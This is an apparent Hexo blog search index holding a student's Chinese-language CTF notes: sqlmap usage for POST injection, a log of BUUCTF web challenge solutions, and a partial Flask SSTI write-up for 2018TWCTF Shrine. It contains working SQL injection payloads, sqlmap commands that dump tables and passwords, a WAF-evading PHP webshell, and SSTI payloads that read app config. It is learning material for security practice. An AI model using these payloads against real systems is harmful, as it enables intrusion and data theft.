<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>纪念一下！</title>
      <link href="/2020/03/12/%E7%BA%AA%E5%BF%B5%E4%B8%80%E4%B8%8B%EF%BC%81/"/>
      <url>/2020/03/12/%E7%BA%AA%E5%BF%B5%E4%B8%80%E4%B8%8B%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>Welcome to CoColer’s blog ！<br>花了一整天终于把博客完善，开心！ 希望自己以后能常常更新趴！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap学习笔记</title>
      <link href="/2020/03/12/sqlmap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/03/12/sqlmap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>（之前刷基础题遇到的都是get请求的sql注入,偶然遇到post请求的注入,记录一下sqlmap新姿势）</p><h1 id="sqlmap（post方式注入）"><a href="#sqlmap（post方式注入）" class="headerlink" title="sqlmap（post方式注入）"></a>sqlmap（post方式注入）</h1><ul><li><p>首先bp抓包，数据包copy to file</p></li><li><p>sqlmap.py -r “D:\1.txt” -p admin_name - -dbs<br>解释一下 -r是读文件 后面是刚才保存的绝对路径，-p是参数，也就是注入点（选了admin_name是注入点）- -dbs意思是想获取数据库名字</p></li><li><p>sqlmap.py -r “D:\1.txt” -D bugkusql1 -p admin_name - -tables<br>解释：-D是表示选择了后面的这个数据库 - -tables是想获取表</p></li><li><p>sqlmap.py -r “D:\1.txt” -D bugkusql1 -T flag1 -p admin_name - -columns<br>爆列名，解释类似上面 不过加了一个-T 指定表</p></li><li><p>最后查字段 命令：sqlmap.py -r “D:\1.txt” -D bugkusql1 -T flag1 -C flag1 -p admin_name - -dump<br>解释：同上面 - -dump是获取字段的命令<br>（在这过程中可能会让你选择Y或者N 可以回车默认）</p></li></ul><h1 id="sqlmap注入基本命令"><a href="#sqlmap注入基本命令" class="headerlink" title="sqlmap注入基本命令"></a>sqlmap注入基本命令</h1><p>爆库 - -dbs<br>-D 选择库  - -tables 爆表<br>-T选择表   - -columns 爆列名<br>-C选择列名 - -dump 查询字段<br>如果字段内容太多，需要花费很多时间。可以指定导出特定范围的字段内容<br>-u “<a href="http://192.168.1.150/products.asp?id=134" target="_blank" rel="noopener">http://192.168.1.150/products.asp?id=134</a>“ -D tourdata -T userb -C “email,Username,userpassword” - -start 1 - -stop 10 - -dump</p><p>参数：</p><p>指定开始的行 - -start</p><p>指定结束的行 - -stop</p><p>此条命令的含义为：导出数据库tourdata中的表userb中的字段(email,Username,userpassword)中的第1到第10行的数据内容。</p><p>（补充）<br>自动跳过询问语句 - -batch<br>web数据库使用账户 - -current user<br>列出sqlserver所有用户 - -user<br>数据库账户与密码 - -passwords  </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9月份Web刷题记录</title>
      <link href="/2019/10/07/9%E6%9C%88%E4%BB%BDWeb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/10/07/9%E6%9C%88%E4%BB%BDWeb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="9月份Web刷题记录"><a href="#9月份Web刷题记录" class="headerlink" title="9月份Web刷题记录"></a>9月份Web刷题记录</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        此系列只做对BUUCTF基本的刷题记录，不做详细的wp，旨在拓宽知识面，快速定位知识点</p><h2 id="2018hctf—admin"><a href="#2018hctf—admin" class="headerlink" title="2018hctf—admin"></a>2018hctf—admin</h2><ul><li>Flask框架——<strong>Session伪造</strong></li><li>strlower()——nodeprep.prepare——Unicode欺骗</li><li>条件竞争</li></ul><p>一题三解</p><p><a href="https://www.anquanke.com/post/id/164086" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164086</a></p><p>关于Session</p><p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p><h2 id="2018护网杯—easy-tornado"><a href="#2018护网杯—easy-tornado" class="headerlink" title="2018护网杯—easy_tornado"></a>2018护网杯—easy_tornado</h2><ul><li>SSTI——tornado框架——模板格式</li><li>Tornado模板注入可快速访问对象<br><code>handler.settings</code>——指向的是RequestHandler.application.settings</li></ul><p>Tornado小记——模板中的Handler</p><p><a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4858870.html</a></p><p>Tornado提供了一些对象别名来快速访问对象，具体定义可以<a href="http://tornado.readthedocs.org/en/latest/guide/templates.html#template-syntax" target="_blank" rel="noopener">参考Tornado官方文档</a>！</p><h2 id="CISCN2019-华北赛区-Day2-Web1-HackWorld"><a href="#CISCN2019-华北赛区-Day2-Web1-HackWorld" class="headerlink" title="CISCN2019 华北赛区 Day2 Web1 HackWorld"></a>CISCN2019 华北赛区 Day2 Web1 HackWorld</h2><p>id=1，2有不同回显，数字型的布尔盲注</p><ul><li>空格被过滤，绕过采用()，有博客说可以用%0a，%a0等，经过fuzz也没被ban，但是做题没注出来</li><li>payload：if((ascii(substr((select(flag)from(flag)),{},1))={}),1,2)</li></ul><h2 id="2019强网杯—高明的黑客"><a href="#2019强网杯—高明的黑客" class="headerlink" title="2019强网杯—高明的黑客"></a>2019强网杯—高明的黑客</h2><ul><li>php代码审计（代码混淆）</li><li>fuzz</li><li>脚本（多线程）</li></ul><h2 id="2019强网杯—随便注"><a href="#2019强网杯—随便注" class="headerlink" title="2019强网杯—随便注"></a>2019强网杯—随便注</h2><ul><li>堆叠查询</li><li>解法1：预编译处理，拼接构造查询语句来绕过select（博客有详细wp）</li><li>解法2：rename、alert，更改表名列名，使默认查询出flag<ul><li>可以用describe命令查表有哪些字段：?inject = ‘ ; describe `tablename`;</li><li>payload：1’;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#`</li></ul></li></ul><h2 id="2019SUCTF—EasySQL"><a href="#2019SUCTF—EasySQL" class="headerlink" title="2019SUCTF—EasySQL"></a>2019SUCTF—EasySQL</h2><p>（源码：select $_GET[‘query’] || flag from flag）</p><ul><li>堆叠查询，from被过滤，且有长度限制，预编译绕过行不通</li><li>非预期解：没有过滤*, 直接注入*, payload：*,1</li><li>预期解：<code>set sql_mode=PIPES_AS_CONCAT;</code>将<code>||</code>视为字符串的连接操作符而非或运算符<ul><li>payload: <code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></li></ul></li></ul><p>关于sql_mode</p><p><a href="https://www.cnblogs.com/sueyyyy/p/10254993.html" target="_blank" rel="noopener">https://www.cnblogs.com/sueyyyy/p/10254993.html</a></p><h2 id="2019SUCTF—CheckIn"><a href="#2019SUCTF—CheckIn" class="headerlink" title="2019SUCTF—CheckIn"></a>2019SUCTF—CheckIn</h2><p>（博客有详细wp记录）</p><ul><li>.user.ini文件</li><li>绕过<code>exif_imagetype()</code></li><li>绕过&lt;?</li></ul><h2 id="2019De1CTF—SSRF-Me"><a href="#2019De1CTF—SSRF-Me" class="headerlink" title="2019De1CTF—SSRF Me"></a>2019De1CTF—SSRF Me</h2><p>(博客有详细wp记录)</p><p>flask框架代码审计</p><ul><li>解法1：md5长度扩展攻击</li><li>解法2：字符串拼接</li><li>解法3：local_file</li></ul><h2 id="2016-0CTF—piapiapia"><a href="#2016-0CTF—piapiapia" class="headerlink" title="2016 0CTF—piapiapia"></a>2016 0CTF—piapiapia</h2><p>（博客有详细wp记录）</p><ul><li>php代码审计</li><li>反序列化逃逸</li><li>遇到路由逻辑引起路径无论是否存在全是200的情况，推荐<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a>扫描（御剑适合cms类型的扫描）</li></ul><h2 id="2019网鼎杯第一场web2—Fakebook"><a href="#2019网鼎杯第一场web2—Fakebook" class="headerlink" title="2019网鼎杯第一场web2—Fakebook"></a>2019网鼎杯第一场web2—Fakebook</h2><ul><li>robots.txt发现user.php.bak文件</li><li>sql布尔盲注发现data列中存储了序列化的值，集合对user.php的代码审计可以判断用户数据通过数据库中的序列化来返回相应的值<ul><li><code>/view.php?no=0</code>报错回显出绝对路径/var/www/html/view.php</li></ul></li><li>序列化构造</li><li>user.php中有ssrf读取本地文件</li><li>union select被waf检测到，union/**/select可绕过，直接构造序列化读取flag.php<ul><li>payload：<code>/view.php?no=0/**/union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}</code></li></ul></li></ul><h2 id="CISCN2019-华北赛区-Day1-Web1—Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1—Dropbox" class="headerlink" title="CISCN2019 华北赛区 Day1 Web1—Dropbox"></a>CISCN2019 华北赛区 Day1 Web1—Dropbox</h2><ul><li>php代码审计</li><li>抓包任意文件读取</li><li>__call触发调用另一个类的不可访问方法</li><li>phar://触发反序列化</li></ul><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="CISCN2019 华北赛区 Day1 Web2 ikun"></a>CISCN2019 华北赛区 Day1 Web2 ikun</h2><p>（博客有详细wp记录）</p><p>一道扩充知识面的题，很有意思，题目考点：</p><ul><li>python脚本搜索关键字</li><li>薅羊毛与逻辑漏洞</li><li>JWT伪造admin<ul><li>爆破JWT得到Secret</li><li>伪造<a href="https://jwt.io/" target="_blank" rel="noopener">JWT</a></li></ul></li><li>python反序列化（pickle）</li></ul><h2 id="2019SUCTF—Pythonginx"><a href="#2019SUCTF—Pythonginx" class="headerlink" title="2019SUCTF—Pythonginx"></a>2019SUCTF—Pythonginx</h2><p>（博客有详细记录）</p><p>出题思路来自blackhat的一个新议题   <a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">传送门</a></p><ul><li><p>Unicode Normalizing to Control Characters</p><p><strong>Fuzz脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse,urlunsplit,urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">65536</span>):</span><br><span class="line">        uni=chr(x)</span><br><span class="line">        url=<span class="string">"http://suctf.c&#123;&#125;"</span>.format(uni)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line">                print(<span class="string">"str: "</span>+uni+<span class="string">' unicode: \\u'</span>+str(hex(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>,<span class="number">65537</span>):    </span><br><span class="line">    tmp=chr(i)    </span><br><span class="line">    <span class="keyword">try</span>:        </span><br><span class="line">        res = tmp.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>)        </span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"-"</span>) <span class="keyword">in</span> res:            </span><br><span class="line">            <span class="keyword">continue</span>        </span><br><span class="line">        print(<span class="string">"U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; "</span>.format(tmp, res, i))    </span><br><span class="line">    <span class="keyword">except</span>:        </span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>Nginx配置文件默认路径（linux，不同版本有差异）</p><ul><li>配置文件存放目录：/etc/nginx</li><li>主配置文件：/etc/nginx/conf/nginx.conf</li><li>安装完路径默认：/usr/local/nginx/conf/nginx.conf</li><li>管理脚本：/usr/lib64/systemd/system/nginx.service</li><li>模块：/usr/lisb64/nginx/modules</li><li>应用程序：/usr/sbin/nginx</li><li>程序默认存放位置：/usr/share/nginx/html</li><li>日志默认存放位置：/var/log/nginx</li></ul></li></ul><p><strong>参考：</strong><a href="https://xz.aliyun.com/t/6070" target="_blank" rel="noopener">url中的unicode漏洞引发的域名安全问题</a></p><p>​            <a href="https://www.cnblogs.com/cimuhuashuimu/p/11490431.html" target="_blank" rel="noopener">idna与utf-8编码漏洞</a></p><h2 id="2017HITCON-CTF-SSRFMe"><a href="#2017HITCON-CTF-SSRFMe" class="headerlink" title="2017HITCON-CTF-SSRFMe"></a>2017HITCON-CTF-SSRFMe</h2><p>（博客有详细wp）</p><ul><li>SSRF读取本地文件</li><li>GET任意命令执行</li></ul><h2 id="2019ASIS-Unicorn"><a href="#2019ASIS-Unicorn" class="headerlink" title="2019ASIS-Unicorn"></a>2019ASIS-Unicorn</h2><ul><li>前端绕过</li><li>Unicode数字欺骗（输入Unicode对应的UTF-8）</li></ul><p><a href="https://www.compart.com/en/unicode/" target="_blank" rel="noopener">Unicode搜索</a></p><p><a href="https://www.zhihu.com/question/23374078" target="_blank" rel="noopener">Unicode和UTF-8有什么区别？</a></p><p>搜索”万”发现对应的UTF-8 coding———0xE4 0xB8 0x87 替换成%E4%B8%87</p><p>官方wp利用了<a href="https://www.compart.com/en/unicode/U+137C" target="_blank" rel="noopener">“埃塞俄比亚数字一万”</a></p><p>关于Unicode利用的几个方面：</p><p><strong><a href="https://xz.aliyun.com/t/5402" target="_blank" rel="noopener">浅谈Unicode设计的安全性</a></strong></p><h2 id="2019ByteCTF—EzCMS"><a href="#2019ByteCTF—EzCMS" class="headerlink" title="2019ByteCTF—EzCMS"></a>2019ByteCTF—EzCMS</h2><ul><li>源码泄露www.zip</li><li>哈希扩展攻击（2019De1CTF—SSRFme也出了此考点）</li><li>mime-content-type函数使用phar://可触发php反序列化</li><li>绕过句首phar://正则———<code>php://filter/resource=phar://...</code><ul><li><a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a></li><li><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">利用 phar 拓展 php 反序列化漏洞攻击面</a></li></ul></li><li>覆盖<code>.htaccess</code>文件使php马得以解析</li><li>PHP原生类找到带有open函数的文件类<code>ZipArchive</code>，得以通过<code>__call</code>去触发open来删除<code>.htaccess</code>文件</li><li>php马以拼接形式绕waf</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"syste"</span>;</span><br><span class="line">$b=<span class="string">"m"</span>;</span><br><span class="line">$c=$a.$b;</span><br><span class="line">$d=$c($_REQUEST[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2018TWCTF—shrine"><a href="#2018TWCTF—shrine" class="headerlink" title="2018TWCTF—shrine"></a>2018TWCTF—shrine</h2><ul><li>Flask——SSTI</li><li>绕过self，config，括号读取配置信息</li><li><code>url_for</code>、<code>get_flashed_messages</code>两个函数对current_app实现引用</li><li><a href="http://www.pythondoc.com/flask/api.html#" target="_blank" rel="noopener">flask官方文档</a>查找内置函数/对象/变量…</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 刷题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018TWCTF—shrine</title>
      <link href="/2019/09/28/2018TWCTF%E2%80%94shrine/"/>
      <url>/2019/09/28/2018TWCTF%E2%80%94shrine/</url>
      
        <content type="html"><![CDATA[<h1 id="2018TWCTF—Shrine"><a href="#2018TWCTF—Shrine" class="headerlink" title="2018TWCTF—Shrine"></a>2018TWCTF—Shrine</h1><p>​            很有意思的一个题，又是没见过的新操作。</p><p>题目直接给出了源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>​        初步审计一下源码，发现只有/shrine处可以有操作空间。因为是jinja的模板。于是用模板语言试试看有没有SSTI</p><p><img src="2018TWCTF—Shrine/1.png" alt=""></p><p>可以看到7*7被解析执行了，存在SSTI，于是理所当然想到常用的payload诸如</p><p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()</code></p><p>还有其他很多payload但是始终绕不过基类向下索引object子类时对括号的限制</p><h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p>​        SSTI大体上有两种利用方式，一种就是常见的向上索引基本类再向下索引object子类来构造恶意函数；另一种就是从框架中读取全局变量。</p><p>​        通过源码我们可以知道flag是写入配置文件里的，如果我们不能直接open/read读取出配置文件的内容，我们还可以采用flask框架全局变量来获取的方式。</p><p><strong>如果我们能用config</strong></p><p><code>config</code>可以直接读取出有关config的相关变量的信息。（然而config被set=Null，是没法直接读取的）</p><p><strong>如果我们能用self</strong></p><p><code>self=&gt;&lt;TemplateReference None&gt;</code></p><p><code>self.__dict__</code>（类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在<strong>类<strong>dict</strong></strong>里的）</p><p><strong>如果我们能用括号</strong></p><p><code>[].__class__.__base__.__subclasses__()[68].__init__.__globals__[&#39;os&#39;].__dict__.environ[&#39;FLAG]</code></p><p>既然前面那些都不能使用，为了获取到config的信息，我们就必须从更上一层的全局变量来获取到config。如何获取？</p><p><strong>current_app</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__globals__[<span class="string">'current_app'</span>].config[<span class="string">'FLAG'</span>]</span><br><span class="line"></span><br><span class="line">top.app.config[<span class="string">'FLAG'</span>]</span><br></pre></td></tr></table></figure><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>从current_app中可以获取到config的内容，那么我们如何去引用current_app呢？（直接使用是不行的）</p><p><strong>url_for</strong> 和 <strong>get_flashed_messages </strong></p><p>这两个函数是flask内置函数，可以通过它们来引用current_app</p><p>其他flask的内置函数/对象/变量请参考<a href="http://www.pythondoc.com/flask/api.html#" target="_blank" rel="noopener">flask官方文档</a></p><p><img src="2018TWCTF—Shrine/2.png" alt=""></p><p>payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125;</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>​        虽然config和self不能直接获取，但是request是有效的，猜测app.config可以通过request某处引用到，于是写一个搜索脚本（来自ctftime上的wp）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># search.py</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(obj, max_depth)</span>:</span></span><br><span class="line">    </span><br><span class="line">    visited_clss = []</span><br><span class="line">    visited_objs = []</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">(obj, path=<span class="string">'obj'</span>, depth=<span class="number">0</span>)</span>:</span></span><br><span class="line">        <span class="keyword">yield</span> path, obj</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> depth == max_depth:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> isinstance(obj, (int, float, bool, str, bytes)):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> isinstance(obj, type):</span><br><span class="line">            <span class="keyword">if</span> obj <span class="keyword">in</span> visited_clss:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            visited_clss.append(obj)</span><br><span class="line">            print(obj)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> obj <span class="keyword">in</span> visited_objs:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            visited_objs.append(obj)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># attributes</span></span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> dir(obj):</span><br><span class="line">            <span class="keyword">if</span> name.startswith(<span class="string">'__'</span>) <span class="keyword">and</span> name.endswith(<span class="string">'__'</span>):</span><br><span class="line">                <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span>  (<span class="string">'__globals__'</span>, <span class="string">'__class__'</span>, <span class="string">'__self__'</span>,</span><br><span class="line">                                 <span class="string">'__weakref__'</span>, <span class="string">'__objclass__'</span>, <span class="string">'__module__'</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            attr = getattr(obj, name)</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> visit(attr, <span class="string">'&#123;&#125;.&#123;&#125;'</span>.format(path, name), depth + <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># dict values</span></span><br><span class="line">        <span class="keyword">if</span> hasattr(obj, <span class="string">'items'</span>) <span class="keyword">and</span> callable(obj.items):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">for</span> k, v <span class="keyword">in</span> obj.items():</span><br><span class="line">                    <span class="keyword">yield</span> <span class="keyword">from</span> visit(v, <span class="string">'&#123;&#125;[&#123;&#125;]'</span>.format(path, repr(k)), depth)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># items</span></span><br><span class="line">        <span class="keyword">elif</span> isinstance(obj, (set, list, tuple, frozenset)):</span><br><span class="line">            <span class="keyword">for</span> i, v <span class="keyword">in</span> enumerate(obj):</span><br><span class="line">                <span class="keyword">yield</span> <span class="keyword">from</span> visit(v, <span class="string">'&#123;&#125;[&#123;&#125;]'</span>.format(path, repr(i)), depth)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">from</span> visit(obj)</span><br></pre></td></tr></table></figure><p>修改app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> search <span class="keyword">import</span> search</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = <span class="string">'TWCTF_FLAG'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> path, obj <span class="keyword">in</span> search(request, <span class="number">10</span>):</span><br><span class="line">        <span class="keyword">if</span> str(obj) == app.config[<span class="string">'FLAG'</span>]:</span><br><span class="line">            <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python3 app.py &amp;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> curl 0:5000/shrine/123</span></span><br><span class="line">obj.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> curl -g <span 